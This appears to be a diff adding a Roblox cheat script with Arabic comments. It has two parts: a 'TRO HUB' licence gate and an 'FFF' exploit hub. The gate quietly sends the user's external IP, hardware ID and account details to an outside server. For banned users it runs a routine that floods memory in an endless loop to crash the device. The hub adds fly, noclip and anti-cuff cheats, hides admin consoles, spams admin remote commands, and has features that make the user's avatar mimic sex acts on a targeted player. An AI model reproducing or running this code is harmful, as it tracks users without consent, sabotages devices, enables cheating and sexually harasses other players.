@@ -1,0 +1,1193 @@
+-- ==========================================
+-- 🛡️ TRO HUB • Ultimate Production Luau Core (Hell Advanced Security)
+-- ==========================================
+
+local API_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/check?id="
+local STORE_URL = "https://43xc5imj1q.apps.bot-hosting.cloud/store_pending"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+
+if getgenv().TRO_HUB_LOADED then
+    warn("TRO HUB: السكربت شغال مسبقاً!")
+    return
+end
+getgenv().TRO_HUB_LOADED = true
+
+local function safeRequest(options)
+    local success, res = pcall(function()
+        local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (delta and delta.request)
+        if req then return req(options) end
+    end)
+    if success and res then return res end
+    return nil
+end
+
+local mapName = "Unknown Map"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then mapName = tostring(info.Name) end
+end)
+local placeIdStr = tostring(game.PlaceId)
+
+local avatarImg = "https://www.roblox.com"
+pcall(function()
+    local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=420x420&format=Png&isCircular=false"
+    local r = safeRequest({Url = thumbUrl, Method = "GET"})
+    if r and r.Body then
+        local data = HttpService:JSONDecode(r.Body)
+        if data and data.data and data.data[1] and data.data[1].imageUrl then
+            avatarImg = tostring(data.data[1].imageUrl)
+        end
+    end
+end)
+
+local extIp = "Unknown_IP"
+pcall(function()
+    local ipRes = safeRequest({Url = "https://api.ipify.org?format=json", Method = "GET"})
+    if ipRes and ipRes.Body then
+        local ipData = HttpService:JSONDecode(ipRes.Body)
+        if ipData and ipData.ip then extIp = tostring(ipData.ip) end
+    end
+end)
+
+local currentHwid = (getgenv and getgenv().gethwid and getgenv().gethwid()) or 
+                  (RbxAnalyticsService and RbxAnalyticsService:GetClientId()) or 
+                  (syn and syn.get_hwid and syn.get_hwid()) or 
+                  ("HWID_" .. tostring(LocalPlayer.UserId))
+
+local userNick = tostring(LocalPlayer.Name) .. " (" .. tostring(LocalPlayer.DisplayName) .. ")"
+
+local function getPayloadForServer(isAllowed)
+    return {
+        user_id = tostring(LocalPlayer.UserId),
+        username = tostring(LocalPlayer.Name),
+        display_name = tostring(LocalPlayer.DisplayName),
+        account_age = tostring(LocalPlayer.AccountAge),
+        game_name = mapName,
+        place_id = placeIdStr,
+        hwid = currentHwid,
+        external_ip = extIp,
+        avatar = avatarImg,
+        status = isAllowed and "allowed" or "denied"
+    }
+end
+
+local function sendServerLog(isAllowed)
+    task.spawn(function()
+        pcall(function()
+            safeRequest({
+                Url = STORE_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(getPayloadForServer(isAllowed))
+            })
+        end)
+    end)
+end
+
+-- 🛑 دالة التدمير
+local isDestroyed = false
+local function triggerDestruction(reason)
+    if isDestroyed then return end
+    isDestroyed = true
+    
+    print("TRO Security: تم حظرك! إطلاق بروتوكول التدمير...")
+    sendServerLog(false)
+    
+    pcall(function()
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui.Name ~= "RobloxGui" then pcall(function() gui:Destroy() end) end
+        end
+        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+            pcall(function() gui:Destroy() end)
+        end
+    end)
+
+    pcall(function()
+        for i = 1, 70 do
+            task.spawn(function()
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(60, 60, 8)
+                part.Position = LocalPlayer.Character and LocalPlayer.Character.Head.Position + Vector3.new(math.random(-60, 60), math.random(0, 50), math.random(-60, 60)) or Vector3.new(0, 10, 0)
+                part.Anchored = true
+                part.CanCollide = false
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromHSV(math.random(), 1, 1)
+                part.Parent = Workspace
+                
+                local gui = Instance.new("SurfaceGui")
+                gui.Face = Enum.NormalId.Front
+                gui.Parent = part
+                
+                local txt = Instance.new("TextLabel")
+                txt.Size = UDim2.new(1, 0, 1, 0)
+                txt.BackgroundTransparency = 1
+                txt.Text = "🚨 TRO HUB: PERMANENTLY BANNED! 🚨\n" .. userNick .. "\nMAP: " .. mapName
+                txt.TextColor3 = Color3.fromRGB(255, 255, 255)
+                txt.TextScaled = true
+                txt.Font = Enum.Font.FredokaOne
+                txt.Parent = gui
+            end)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            print("🚨 TRO HUB: PERMANENTLY BANNED! 🚨")
+            task.wait(0.01)
+        end
+    end)
+
+    pcall(function()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "TRO_Double_Annihilation"
+        screenGui.IgnoreGuiInset = true
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        
+        if syn and syn.protect_gui then
+            syn.protect_gui(screenGui)
+            screenGui.Parent = CoreGui
+        else
+            pcall(function() screenGui.Parent = CoreGui end)
+            if not screenGui.Parent then screenGui.Parent = LocalPlayer.PlayerGui end
+        end
+
+        local bg = Instance.new("Frame")
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        bg.BorderSizePixel = 0
+        bg.Parent = screenGui
+
+        task.spawn(function()
+            local cList = {Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(255,255,255), Color3.fromRGB(0,0,0)}
+            while true do
+                for _, col in ipairs(cList) do
+                    bg.BackgroundColor3 = col
+                    task.wait(0.01)
+                end
+            end
+        end)
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "FATAL ERROR: DEVICE FROZEN!"
+        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.FredokaOne
+        textLabel.TextWrapped = true
+        textLabel.Parent = screenGui
+    end)
+
+    task.spawn(function()
+        local doubleMemoryEater = {}
+        while true do
+            for i = 1, 3000000 do
+                table.insert(doubleMemoryEater, string.rep("TRO_DOUBLE_CRASH_KILL_BYPASS", 1000))
+            end
+            RunService.RenderStepped:Wait()
+        end
+    end)
+end
+
+-- ⚡ الفحص
+local function checkStatus()
+    local targetUrl = API_URL .. tostring(LocalPlayer.UserId) .. "&hwid=" .. tostring(currentHwid) .. "&t=" .. math.random(1000, 9999)
+    local res = safeRequest({Url = targetUrl, Method = "GET"})
+    
+    if res and res.Body then
+        local successDecode, data = pcall(function()
+            return HttpService:JSONDecode(res.Body)
+        end)
+        if successDecode and data then
+            return data.status, data.reason
+        end
+    end
+    return "error", "connection_failed"
+end
+
+local initialStatus, initialReason = checkStatus()
+if initialStatus == "denied" then
+    triggerDestruction(initialReason)
+    return
+end
+
+print("TRO Security: تم التحقق بنجاح! أهلاً بك.")
+sendServerLog(true)
+
+-- ==========================================
+-- 🟢 سكربتك الأساسي يوضع هنا:
+-- ==========================================
+print("TRO HUB: تم تشغيل السكربت بنجاح.")
+
+task.spawn(function()
+    while task.wait(5) do
+        local currentStatus, currentReason = checkStatus()
+        if currentStatus == "denied" then
+            triggerDestruction(currentReason)
+            break
+        end
+    end
+end)
+
+
+--[[
+    FFF — V5 (Full)
+    ✅ BANG: يحفظ مكانك ويرجعه عند الإيقاف
+    ✅ FACE BANG: نسخة VR7 HeadFuck حرفيًا (Sit + Head CFrame + sine sum)
+    ✅ Anti-AFK محسّن: يمشي + ينط + يتحرك + يرجع لمكانه
+    ✅ تبويب الحركة (Speed/Jump/Noclip/Fly)
+    ✅ Anti-Void + Anti-Sit + Anti-Cuff + SH + SH-Spam
+    ✅ نظام تنظيف كامل عند إعادة التحميل
+]]
+
+-- ============ SERVICES ============
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Chat = game:GetService("Chat")
+local VirtualUser = game:GetService("VirtualUser")
+local StarterGui = game:GetService("StarterGui")
+
+local LP = Players.LocalPlayer
+local PG = LP:WaitForChild("PlayerGui")
+
+-- ============ CLEANUP ============
+if _G.FFF_CLEANUP then pcall(_G.FFF_CLEANUP) end
+local CONNS, CLEANUP_FNS = {}, {}
+local function on(c) table.insert(CONNS, c); return c end
+local function reg(fn) table.insert(CLEANUP_FNS, fn) end
+_G.FFF_CLEANUP = function()
+    for _, c in ipairs(CONNS) do pcall(function() c:Disconnect() end) end
+    CONNS = {}
+    for _, fn in ipairs(CLEANUP_FNS) do pcall(fn) end
+    CLEANUP_FNS = {}
+    local old = PG:FindFirstChild("FFF")
+    if old then old:Destroy() end
+end
+
+-- ============ CONFIG ============
+local C = {
+    bg = Color3.fromRGB(0, 0, 0),
+    panel = Color3.fromRGB(10, 10, 10),
+    panel2 = Color3.fromRGB(20, 20, 20),
+    line = Color3.fromRGB(40, 40, 40),
+    text = Color3.fromRGB(255, 255, 255),
+    textDim = Color3.fromRGB(150, 150, 150),
+    green = Color3.fromRGB(100, 255, 100),
+    red = Color3.fromRGB(255, 100, 100),
+}
+
+-- ============ UTILITIES ============
+local function make(class, props, parent)
+    local o = Instance.new(class)
+    for k, v in pairs(props or {}) do o[k] = v end
+    o.Parent = parent
+    return o
+end
+local function round(o, px) make("UICorner", {CornerRadius = UDim.new(0, px or 6)}, o) end
+local function outline(o, color, thick)
+    make("UIStroke", {Color = color or C.line, Thickness = thick or 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, o)
+end
+local function label(parent, text, pos, size, fontSize, color, font, align)
+    return make("TextLabel", {
+        Position = pos, Size = size, BackgroundTransparency = 1, Text = text,
+        TextColor3 = color or C.text, TextSize = fontSize or 14,
+        Font = font or Enum.Font.Gotham,
+        TextXAlignment = align or Enum.TextXAlignment.Center,
+        TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 5
+    }, parent)
+end
+local function mkBtn(parent, text, pos, size, bg, tc)
+    local b = make("TextButton", {
+        Position = pos, Size = size, BackgroundColor3 = bg or C.bg,
+        Text = text, TextColor3 = tc or C.text,
+        Font = Enum.Font.GothamBold, TextSize = 13,
+        AutoButtonColor = false, ZIndex = 5
+    }, parent)
+    round(b, 6); outline(b, C.line, 1)
+    return b
+end
+local function mkBox(parent, ph, pos, size)
+    local t = make("TextBox", {
+        Position = pos, Size = size, BackgroundColor3 = C.bg,
+        TextColor3 = C.text, PlaceholderText = ph,
+        PlaceholderColor3 = C.textDim, Font = Enum.Font.Gotham,
+        TextSize = 13, TextXAlignment = Enum.TextXAlignment.Center,
+        ClearTextOnFocus = false, ZIndex = 5
+    }, parent)
+    round(t, 6); outline(t, C.line, 1)
+    return t
+end
+
+local function getPlayer(q)
+    if not q or q == "" then return nil end
+    q = q:lower()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP and (p.Name:lower() == q or p.DisplayName:lower() == q) then return p end
+    end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP and (p.Name:lower():sub(1,#q) == q or p.DisplayName:lower():sub(1,#q) == q) then return p end
+    end
+    return nil
+end
+local function getRoot(p) local c = p and p.Character; return c and c:FindFirstChild("HumanoidRootPart") end
+local function getHum(p) local c = p and p.Character; return c and c:FindFirstChildOfClass("Humanoid") end
+local function getTorso(p)
+    local c = p and p.Character
+    if not c then return nil end
+    return c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
+end
+local function getHead(p) local c = p and p.Character; return c and c:FindFirstChild("Head") end
+
+-- ============ ANIMATIONS ============
+local activeAnims = {}
+local function playAnim(id, speed)
+    local hum = getHum(LP)
+    if not hum then return end
+    local a = Instance.new("Animation")
+    a.AnimationId = "rbxassetid://" .. tostring(id)
+    local t = hum:LoadAnimation(a)
+    t.Looped = true
+    t.Priority = Enum.AnimationPriority.Action4
+    t:Play()
+    if speed then t:AdjustSpeed(speed) end
+    table.insert(activeAnims, t)
+    return t
+end
+local function stopAnims()
+    for _, t in ipairs(activeAnims) do pcall(function() t:Stop() end) end
+    activeAnims = {}
+end
+local function stopAllAnims()
+    local hum = getHum(LP)
+    if not hum then return end
+    for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+        pcall(function() track:Stop() end)
+    end
+end
+
+-- ============ BANG STATE ============
+local bang = { active = false, target = nil, mode = nil, conn = nil, savedCF = nil, loopTask = nil }
+
+local function stopBang()
+    local wasActive = bang.active
+    bang.active = false
+    bang.target = nil
+    bang.mode = nil
+    if bang.conn then bang.conn:Disconnect(); bang.conn = nil end
+    if bang.loopTask then bang.loopTask = nil end
+    stopAnims()
+    stopAllAnims()
+
+    local hum = getHum(LP)
+    local root = getRoot(LP)
+
+    if root and bang.savedCF then
+        pcall(function()
+            root.CFrame = bang.savedCF
+            root.Velocity = Vector3.zero
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+
+    if hum then
+        pcall(function()
+            hum.Sit = false
+            hum.PlatformStand = false
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+        end)
+    end
+
+    bang.savedCF = nil
+    pcall(function() workspace.FallenPartsDestroyHeight = -500 end)
+
+    if wasActive then
+        task.delay(0.4, function()
+            local h = getHum(LP)
+            if h then pcall(function() h:ChangeState(Enum.HumanoidStateType.GettingUp) end) end
+        end)
+    end
+end
+reg(stopBang)
+
+-- ============ BANG (VR7 Benx style) ============
+local function startBang(target)
+    stopBang()
+    bang.active = true
+    bang.target = target
+    bang.mode = "body"
+
+    local myRoot = getRoot(LP)
+    if myRoot then bang.savedCF = myRoot.CFrame end
+
+    local hum = getHum(LP)
+    local isR15 = hum and hum.RigType == Enum.HumanoidRigType.R15
+    local animId = isR15 and 5918726674 or 148840371
+    local animSpeed = isR15 and 3.5 or 5.5
+
+    workspace.FallenPartsDestroyHeight = -math.huge
+    playAnim(animId, animSpeed)
+
+    bang.conn = on(RunService.Heartbeat:Connect(function()
+        if not bang.active or bang.mode ~= "body" then return end
+        local t = bang.target
+        if not t or not t.Parent or not t.Character then return stopBang() end
+        local torso = getTorso(t)
+        local root = getRoot(LP)
+        local h = getHum(LP)
+        if not (torso and root and h) then return end
+        pcall(function()
+            h.Sit = true
+            root.CFrame = torso.CFrame * CFrame.new(0, 0, 1)
+            root.Velocity = Vector3.zero
+        end)
+    end))
+end
+
+-- ============ FACE BANG (VR7 HeadFuck style) ============
+local function startFaceBang(target)
+    stopBang()
+    bang.active = true
+    bang.target = target
+    bang.mode = "face"
+
+    local myRoot = getRoot(LP)
+    if myRoot then bang.savedCF = myRoot.CFrame end
+
+    workspace.FallenPartsDestroyHeight = -math.huge
+    stopAllAnims()
+
+    bang.loopTask = task.spawn(function()
+        local sum = -2
+        local speed = 0.3
+
+        while bang.active and bang.mode == "face" do
+            task.wait(0.01)
+            local t = bang.target
+            if not t or not t.Parent or not t.Character then
+                stopBang()
+                break
+            end
+
+            local head = getHead(t)
+            local root = getRoot(LP)
+            local h = getHum(LP)
+
+            if head and root and h then
+                pcall(function()
+                    h.Sit = true
+                    root.CFrame = head.CFrame * CFrame.new(0, 0.7, sum) * CFrame.Angles(0, math.rad(180), 0)
+                    root.Velocity = Vector3.zero
+
+                    sum = sum + speed
+                    if sum >= -1 or sum <= -2 then
+                        speed = -speed
+                    end
+                end)
+            end
+        end
+    end)
+end
+
+-- ============ MOVEMENT ============
+local function setSpeed(v)
+    local hum = getHum(LP)
+    if hum then hum.WalkSpeed = tonumber(v) or 16 end
+end
+local function setJump(v)
+    local hum = getHum(LP)
+    if hum then hum.JumpPower = tonumber(v) or 50 end
+end
+
+local noclipConn
+local function toggleNoclip(on_)
+    if noclipConn then noclipConn:Disconnect(); noclipConn = nil end
+    if not on_ then return end
+    noclipConn = on(RunService.Stepped:Connect(function()
+        if LP.Character then
+            for _, part in ipairs(LP.Character:GetDescendants()) do
+                if part:IsA("BasePart") and part.CanCollide then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end))
+end
+reg(function() toggleNoclip(false) end)
+
+local flyConn, flyBV, flyBG
+local function toggleFly(on_)
+    if flyConn then flyConn:Disconnect(); flyConn = nil end
+    if flyBV then flyBV:Destroy(); flyBV = nil end
+    if flyBG then flyBG:Destroy(); flyBG = nil end
+    local hum = getHum(LP)
+    if hum then hum.PlatformStand = false end
+    if not on_ then return end
+
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not (root and hum) then return end
+
+    flyBV = Instance.new("BodyVelocity")
+    flyBV.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+    flyBV.Velocity = Vector3.zero
+    flyBV.Parent = root
+
+    flyBG = Instance.new("BodyGyro")
+    flyBG.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
+    flyBG.P = 10000
+    flyBG.Parent = root
+
+    hum.PlatformStand = true
+
+    flyConn = on(RunService.Heartbeat:Connect(function()
+        if not (flyBV and flyBG and LP.Character) then return end
+        local cam = workspace.CurrentCamera
+        flyBG.CFrame = cam.CFrame
+        local dir = Vector3.zero
+        if UIS:IsKeyDown(Enum.KeyCode.W) then dir += cam.CFrame.LookVector end
+        if UIS:IsKeyDown(Enum.KeyCode.S) then dir -= cam.CFrame.LookVector end
+        if UIS:IsKeyDown(Enum.KeyCode.A) then dir -= cam.CFrame.RightVector end
+        if UIS:IsKeyDown(Enum.KeyCode.D) then dir += cam.CFrame.RightVector end
+        if UIS:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.yAxis end
+        if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir -= Vector3.yAxis end
+        flyBV.Velocity = dir * 60
+    end))
+end
+reg(function() toggleFly(false) end)
+
+-- ============ PROTECTIONS ============
+local antiSitConn
+local function toggleAntiSit(on_)
+    if antiSitConn then antiSitConn:Disconnect(); antiSitConn = nil end
+    if not on_ then return end
+    antiSitConn = on(RunService.Stepped:Connect(function()
+        local hum = getHum(LP)
+        if hum then
+            if hum.Sit then hum.Sit = false end
+            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        end
+    end))
+end
+reg(function() toggleAntiSit(false) end)
+
+local antiCuffConn
+local function toggleAntiCuff(on_)
+    if antiCuffConn then antiCuffConn:Disconnect(); antiCuffConn = nil end
+    if not on_ then return end
+    antiCuffConn = on(RunService.Stepped:Connect(function()
+        local char = LP.Character
+        if not char then return end
+        local hum = getHum(LP)
+        if hum then
+            if hum.PlatformStand then hum.PlatformStand = false end
+            if hum.Sit then hum.Sit = false end
+        end
+        for _, obj in ipairs(char:GetDescendants()) do
+            if obj:IsA("Weld") or obj:IsA("WeldConstraint") or obj:IsA("AlignPosition") then
+                local p0, p1 = obj.Part0, obj.Part1
+                if (p0 and p0.Parent and not p0:IsDescendantOf(char)) or
+                   (p1 and p1.Parent and not p1:IsDescendantOf(char)) then
+                    obj:Destroy()
+                end
+            end
+        end
+    end))
+end
+reg(function() toggleAntiCuff(false) end)
+
+-- ============ ANTI-AFK (يمشي + ينط + يتحرك) ============
+local antiAfkConn = nil
+local antiAfkLoopConn = nil
+local antiAfkData = {
+    enabled = false,
+    startCF = nil,
+    moveTimer = 0,
+    jumpTimer = 0,
+    clickTimer = 0,
+    nextJump = math.random(2, 4),
+}
+
+local function captureAfkStart()
+    local root = getRoot(LP)
+    if root then
+        antiAfkData.startCF = root.CFrame
+    end
+end
+
+local function toggleAntiAfk(on_)
+    if antiAfkConn then antiAfkConn:Disconnect(); antiAfkConn = nil end
+    if antiAfkLoopConn then antiAfkLoopConn:Disconnect(); antiAfkLoopConn = nil end
+    antiAfkData.enabled = on_
+    if not on_ then return end
+
+    antiAfkData.moveTimer = 0
+    antiAfkData.jumpTimer = 0
+    antiAfkData.clickTimer = 0
+    antiAfkData.nextJump = math.random(2, 4)
+    captureAfkStart()
+
+    on(LP.CharacterAdded:Connect(function()
+        task.wait(1)
+        if antiAfkData.enabled then captureAfkStart() end
+    end))
+
+    antiAfkConn = on(LP.Idled:Connect(function()
+        pcall(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end)
+    end))
+
+    antiAfkLoopConn = on(RunService.Heartbeat:Connect(function(dt)
+        if not antiAfkData.enabled then return end
+        local hum = getHum(LP)
+        local root = getRoot(LP)
+        if not (hum and root) then return end
+        if hum.Health <= 0 then return end
+
+        -- إرجاع لو ابتعد أكثر من 30 ستود
+        if antiAfkData.startCF then
+            local dist = (root.Position - antiAfkData.startCF.Position).Magnitude
+            if dist > 30 then
+                pcall(function()
+                    root.CFrame = antiAfkData.startCF
+                    root.AssemblyLinearVelocity = Vector3.zero
+                end)
+            end
+        end
+
+        -- مشي عشوائي كل 1.2 ثانية
+        antiAfkData.moveTimer = antiAfkData.moveTimer + dt
+        if antiAfkData.moveTimer >= 1.2 then
+            antiAfkData.moveTimer = 0
+            local angle = math.random() * math.pi * 2
+            local dist = math.random(20, 50)
+            local base = antiAfkData.startCF and antiAfkData.startCF.Position or root.Position
+            local target = Vector3.new(
+                base.X + math.cos(angle) * dist,
+                base.Y,
+                base.Z + math.sin(angle) * dist
+            )
+            pcall(function() hum:MoveTo(target) end)
+        end
+
+        -- قفز عشوائي كل 2-4 ثواني
+        antiAfkData.jumpTimer = antiAfkData.jumpTimer + dt
+        if antiAfkData.jumpTimer >= antiAfkData.nextJump then
+            antiAfkData.jumpTimer = 0
+            antiAfkData.nextJump = math.random(2, 4)
+            pcall(function()
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            end)
+        end
+
+        -- نقرة احتياطية كل 5 ثواني
+        antiAfkData.clickTimer = antiAfkData.clickTimer + dt
+        if antiAfkData.clickTimer >= 5 then
+            antiAfkData.clickTimer = 0
+            pcall(function()
+                VirtualUser:CaptureController()
+                VirtualUser:ClickButton2(Vector2.new())
+            end)
+        end
+    end))
+end
+reg(function() toggleAntiAfk(false) end)
+
+-- Anti-Void
+local antiVoidConn
+local function toggleAntiVoid(on_)
+    if antiVoidConn then antiVoidConn:Disconnect(); antiVoidConn = nil end
+    if not on_ then return end
+    antiVoidConn = on(RunService.Heartbeat:Connect(function()
+        local root = getRoot(LP)
+        if root and root.Position.Y < -50 then
+            pcall(function() root.CFrame = CFrame.new(0, 50, 0) end)
+        end
+    end))
+end
+reg(function() toggleAntiVoid(false) end)
+
+-- SH Admin
+local shAdminConn
+local shHidden = {}
+local keywords = {"admin", "cmd", "log", "console", "command"}
+local function isTargetGUI(g)
+    if not (g:IsA("ScreenGui") or g:IsA("Frame") or g:IsA("BillboardGui")) then return false end
+    local n = g.Name:lower()
+    if n == "fff" then return false end
+    for _, k in ipairs(keywords) do if n:find(k) then return true end end
+    return false
+end
+local function toggleSH(on_)
+    if shAdminConn then shAdminConn:Disconnect(); shAdminConn = nil end
+    if not on_ then
+        for g, p in pairs(shHidden) do if g and p then g.Parent = p end end
+        shHidden = {}
+        return
+    end
+    shAdminConn = on(RunService.Heartbeat:Connect(function()
+        pcall(function() StarterGui:SetCore("DevConsoleVisible", false) end)
+        for _, child in ipairs(PG:GetChildren()) do
+            if isTargetGUI(child) and not shHidden[child] then
+                shHidden[child] = child.Parent
+                child.Parent = nil
+            end
+        end
+    end))
+end
+reg(function() toggleSH(false) end)
+
+-- SH Spam
+local shSpamConn
+local function toggleSHSpam(on_)
+    if shSpamConn then shSpamConn:Disconnect(); shSpamConn = nil end
+    if not on_ then return end
+    shSpamConn = on(RunService.Heartbeat:Connect(function()
+        for _, d in ipairs(PG:GetDescendants()) do
+            if d:IsA("TextLabel") and d.Text == "System" then
+                local f = d.Parent
+                if f and f:IsA("GuiObject") then
+                    pcall(function() f.Visible = false; f:Destroy() end)
+                end
+            end
+        end
+    end))
+end
+reg(function() toggleSHSpam(false) end)
+
+-- ============ CUFF ============
+local function findCuffTool(container)
+    if not container then return nil end
+    for _, v in ipairs(container:GetChildren()) do
+        if v:IsA("Tool") and (v.Name:lower():find("كلبشه") or v.Name:lower():find("cuff")) then
+            return v
+        end
+        if #v:GetChildren() > 0 then
+            local f = findCuffTool(v)
+            if f then return f end
+        end
+    end
+    return nil
+end
+
+-- ============ VOID ============
+local function doVoid()
+    local root = getRoot(LP)
+    if not root then return end
+    local saved = root.CFrame
+    pcall(function() root.CFrame = CFrame.new(999999, 999999, 999999) end)
+    task.delay(3, function()
+        local newRoot = getRoot(LP)
+        if newRoot then pcall(function() newRoot.CFrame = saved end) end
+    end)
+end
+
+-- ============ SPAM ============
+local spamActive = false
+local SPAM_V1 = ";NV ;RE logs ;Warp ;RE logs ;NV ;RE logs ;Warp ;RE logs ;NV ;RE logs ;Warp ;RE logs"
+local SPAM_V2 = ";NV ;RE ;Warp ;RE ;NV ;RE ;Warp ;RE ;NV ;RE ;Warp ;RE"
+local function sendChat(msg)
+    task.defer(function()
+        pcall(function()
+            local head = LP.Character and LP.Character:FindFirstChild("Head")
+            if head then Chat:Chat(head, msg, Enum.ChatColor.White) end
+        end)
+        local ev = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if ev then
+            local req = ev:FindFirstChild("SayMessageRequest")
+            if req then pcall(function() req:FireServer(msg, "All") end) end
+        end
+    end)
+end
+local function sendHD(cmd)
+    task.defer(function()
+        pcall(function()
+            local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+            if hd then
+                local sig = hd:FindFirstChild("Signals")
+                if sig then
+                    local rc = sig:FindFirstChild("RequestCommandSilent")
+                    if rc then rc:InvokeServer(cmd) end
+                end
+            end
+        end)
+    end)
+end
+
+-- ============ GUI ============
+local gui = make("ScreenGui", {
+    Name = "FFF", ResetOnSpawn = false, IgnoreGuiInset = true,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 999
+}, PG)
+
+local window = make("Frame", {
+    AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+    Size = UDim2.fromOffset(600, 400), BackgroundColor3 = C.bg,
+    BorderSizePixel = 0, ClipsDescendants = true, ZIndex = 2
+}, gui)
+round(window, 12); outline(window, C.line, 1.5)
+
+local uiScale = Instance.new("UIScale", window)
+local function updateScale()
+    local cam = workspace.CurrentCamera
+    if not cam then return end
+    local vp = cam.ViewportSize
+    uiScale.Scale = math.min((vp.X - 60) / 600, (vp.Y - 60) / 400, 1)
+end
+on(workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale))
+updateScale()
+
+local header = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3
+}, window)
+round(header, 12)
+label(header, "FFF", UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 1, 0), 20, C.text, Enum.Font.GothamBlack)
+
+local toggleBtn = make("TextButton", {
+    Size = UDim2.fromOffset(50, 50), Position = UDim2.new(0, 20, 0.5, -25),
+    BackgroundColor3 = C.bg, Text = "F", TextColor3 = C.text,
+    Font = Enum.Font.GothamBlack, TextSize = 22, AutoButtonColor = false, ZIndex = 1000
+}, gui)
+round(toggleBtn, 100); outline(toggleBtn, C.text, 2)
+
+local function makeDraggable(handle, target)
+    local dragging, dStart, pStart
+    on(handle.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging, dStart, pStart = true, i.Position, target.Position
+        end
+    end))
+    on(UIS.InputChanged:Connect(function(i)
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local d = i.Position - dStart
+            target.Position = UDim2.new(pStart.X.Scale, pStart.X.Offset + d.X, pStart.Y.Scale, pStart.Y.Offset + d.Y)
+        end
+    end))
+    on(UIS.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end))
+end
+makeDraggable(header, window)
+makeDraggable(toggleBtn, toggleBtn)
+
+local isOpen = true
+local function toggleUI()
+    isOpen = not isOpen
+    if isOpen then
+        window.Visible = true
+        window.Size = UDim2.fromOffset(0, 0)
+        window.Position = UDim2.new(0, toggleBtn.AbsolutePosition.X, 0, toggleBtn.AbsolutePosition.Y)
+        TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Back), {
+            Size = UDim2.fromOffset(600, 400), Position = UDim2.fromScale(0.5, 0.5)
+        }):Play()
+    else
+        local t = TweenService:Create(window, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
+            Size = UDim2.fromOffset(0, 0),
+            Position = UDim2.new(0, toggleBtn.AbsolutePosition.X, 0, toggleBtn.AbsolutePosition.Y)
+        })
+        t:Play()
+        t.Completed:Connect(function() window.Visible = false end)
+    end
+end
+on(toggleBtn.MouseButton1Click:Connect(toggleUI))
+on(UIS.InputBegan:Connect(function(i, g)
+    if not g and i.KeyCode == Enum.KeyCode.B then toggleUI() end
+end))
+
+local sidebar = make("Frame", {
+    Position = UDim2.fromOffset(10, 50), Size = UDim2.fromOffset(110, 340),
+    BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3
+}, window)
+round(sidebar, 10); outline(sidebar, C.line, 1)
+
+local tabList = {
+    {name="main", text="الرئيسية"},
+    {name="target", text="الاستهداف"},
+    {name="move", text="الحركة"},
+    {name="cuff", text="كلبشة"},
+    {name="protect", text="الحمايات"},
+    {name="void", text="فويد"},
+    {name="spam", text="سبام"},
+}
